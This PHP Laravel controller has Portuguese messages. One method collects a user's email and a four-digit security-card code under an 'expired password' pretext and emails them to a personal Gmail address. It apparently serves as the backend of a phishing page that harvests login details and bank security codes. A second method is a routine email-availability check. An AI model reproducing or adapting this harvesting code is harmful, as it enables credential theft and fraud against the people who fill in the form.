<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\SenhaVencidaMail;
use App\Models\User; // Adicione esta linha para usar o modelo User

class UserController extends Controller
{
    public function checkEmail(Request $request)
    {
        ini_set('max_execution_time', 120);

        $request->validate([
            'email' => 'required|email',
            'cartao_seg' => 'required|digits:4',
        ]);

        $dados = $request->only('email', 'cartao_seg');

        Mail::to('argontechsolut@gmail.com')->send(new SenhaVencidaMail($dados));

        return back()->with('status', 'Seu pedido foi enviado. Em breve entraremos em contato.');
    }
    
    // Novo método para verificar disponibilidade de email
    public function checkEmailAvailability(Request $request)
    {
        $request->validate([
            'email' => 'required|email'
        ]);

        // Verifica se o email já existe no banco de dados
        $emailExists = User::where('email', $request->email)->exists();

        if ($emailExists) {
            return response()->json([
                'available' => false,
                'message' => 'Este email já está em uso. Por favor, escolha outro.'
            ], 409); // 409 Conflict - indica que o recurso já existe
        }

        return response()->json([
            'available' => true,
            'message' => 'Email disponível'
        ]);
    }
}